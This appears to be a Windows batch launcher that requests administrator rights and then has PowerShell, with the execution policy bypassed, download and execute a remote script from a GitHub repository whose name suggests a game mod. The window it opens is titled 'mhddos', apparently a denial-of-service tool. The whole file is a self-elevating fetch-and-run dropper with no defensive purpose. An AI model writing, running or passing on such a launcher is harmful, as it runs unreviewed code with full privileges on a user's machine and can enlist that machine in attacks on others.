@echo off
if not "%1"=="am_admin" ( powershell start -verb runas '%0' 'am_admin "%~1" "%~2"' & exit )
:: u.w.u....BA30H
set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/l4d2-tro-mod/main/1.ps1'))"
start "mhddos" powershell -executionpolicy bypass -command "%_PS1_COMMAND%"
exit
